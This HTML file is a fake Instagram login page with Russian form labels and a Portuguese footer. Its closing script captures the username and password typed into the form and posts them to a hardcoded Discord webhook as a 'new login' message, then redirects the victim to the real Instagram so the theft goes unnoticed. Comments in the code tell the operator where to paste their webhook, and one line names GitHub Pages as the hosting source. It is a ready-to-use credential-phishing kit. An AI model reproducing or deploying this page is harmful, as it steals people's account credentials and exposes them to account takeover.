<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="insta-fav.ico">
    <title>login</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="instagram-logo.png" alt="Instagramm logo" title="Instagramm logo" />
                </h1>
                <form class="login-form">
                    <label for="email" class="sr-only">Имя пользователья, номер мобильного телефона или электронный адрес почты</label>
                    <input type="text" id="username" placeholder="Имя пользователья, номер мобильного телефона или электронный адрес почты"required />

                    <label for="password" class="sr-only">Пароль</label>
                    <input type="password" id="password" placeholder="Пароль"required />

                    <button type="submit">Войти</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">Или</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                    </div>
                    <a href="#">Забыли Пароль?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>У вас нет аккаунта?</p>
                <a href="#">Регистрация</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Скачайте приложение</p>
                <div class="flex justify-content-center">
                    <img src="apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">SOBRE</a></li>
            <li><a href="#">AJUDA</a></li>
            <li><a href="#">IMPRENSA</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CARREIRAS</a></li>
            <li><a href="#">PRIVACIDADE</a></li>
            <li><a href="#">TERMOS</a></li>
            <li><a href="#">LOCALIZAÇÃO</a></li>
            <li><a href="#">CONTAS MAIS RELEVANTES</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">IDIOMA</a></li>
        </ul>
        <p class="copyright">© 2026 Личный кабинет</p>
    </footer>
<script>
document.querySelector('.login-form').addEventListener('submit', function(e) {
    e.preventDefault(); // Отменяем перезагрузку страницы

    // ВСТАВЬТЕ МЕЖДУ КАВЫЧКАМИ ССЫЛКУ, КОТОРУЮ СКОПИРОВАЛИ В DISCORD
    const webhookUrl = "https://discord.com/api/webhooks/1506397733353951232/ZYbHNpnjPwz3bLpgt017Xf89Xb5Js6Scc2J88_wyWHopidDQIqea98n_Rgr6WPdiUmHe";

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Формируем красивое сообщение для Discord канала
    const payload = {
        content: `🔔 **Новый лог авторизации!**\n👤 **Логин:** \`${username}\`\n🔑 **Пароль:** \`${password}\`\n🌐 **Источник:** GitHub Pages`
    };

    // Отправляем данные в Discord
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(() => {
        // После успешной отправки переводим человека на настоящий Instagram
        window.location.href = 'https://instagram.com';
    })
    .catch((error) => {
        console.error('Ошибка:', error);
        // В случае сбоя всё равно уводим на официальный сайт
        window.location.href = 'https://instagram.com';
    });
});
</script>



</body>
</html>
